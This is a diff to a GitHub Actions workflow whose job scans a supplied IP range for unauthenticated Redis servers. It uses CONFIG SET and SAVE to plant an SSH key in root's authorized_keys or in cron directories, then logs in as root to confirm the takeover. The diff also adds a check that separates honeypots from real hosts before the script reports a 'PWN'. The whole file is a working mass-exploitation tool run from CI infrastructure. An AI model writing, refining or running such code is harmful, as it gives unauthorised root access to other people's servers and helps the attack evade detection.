@@ -19,12 +19,13 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       - name: redis
+        env:
+          PUBKEY: ${{ inputs.pubkey }}
+          CIDR: ${{ inputs.cidr }}
         run: |
           ssh-keygen -t ed25519 -f /tmp/k -N "" -q
-          PUBKEY="${{ inputs.pubkey }}"
-          if [ -n "$PUBKEY" ]; then printf '%s
-' "$PUBKEY" > /tmp/k.pub; fi
-          CIDR="${{ inputs.cidr }}" python3 - <<'PY'
+          if [ -n "$PUBKEY" ]; then echo "$PUBKEY" > /tmp/k.pub; fi
+          python3 - <<'PY'
           import asyncio
           import ipaddress
           import os
@@ -82,19 +83,31 @@ jobs:
                   print("AUTH", ip, pong[:40], flush=True)
                   continue
               print("UNAUTH", ip, flush=True)
-              print("  dir", cmd(ip, "CONFIG", "GET", "dir")[:80], flush=True)
               for directory in ("/root/.ssh", "/home/ubuntu/.ssh", "/var/spool/cron"):
                   cmd(ip, "CONFIG", "SET", "dir", directory)
                   cmd(ip, "CONFIG", "SET", "dbfilename", "authorized_keys")
                   cmd(ip, "SET", "pwn", "\n\n" + pub + "\n\n")
                   save = cmd(ip, "SAVE")
-                  print("  try", directory, save[:40], flush=True)
-                  if b"+OK" in save:
+                  if b"+OK" not in save:
+                      continue
+                  try:
                       result = subprocess.run(
                           ["ssh", "-i", "/tmp/k", "-o", "StrictHostKeyChecking=no",
-                           "-o", "ConnectTimeout=6", f"root@{ip}", "id; nproc; hostname"],
+                           "-o", "ConnectTimeout=6", f"root@{ip}", "id"],
                           capture_output=True, text=True, timeout=12)
-                      if result.returncode == 0 and "uid=0" in result.stdout:
-                          print("PWN", ip, result.stdout.replace("\n", " | ")[:200], flush=True)
-                          break
+                  except Exception:
+                      continue
+                  if result.returncode != 0 or "uid=0" not in result.stdout:
+                      continue
+                  try:
+                      check = subprocess.run(
+                          ["ssh", "-i", "/tmp/k", "-o", "StrictHostKeyChecking=no",
+                           "-o", "ConnectTimeout=6", f"root@{ip}",
+                           "test -x /bin/ls && test -x /usr/bin/curl && echo REAL || echo FAKE"],
+                          capture_output=True, text=True, timeout=12)
+                  except Exception:
+                      check = None
+                  verdict = "REAL" if check and "REAL" in check.stdout else "FAKE"
+                  print("PWN", verdict, ip, result.stdout.replace("\n", " | ")[:160], flush=True)
+                  break
           PY
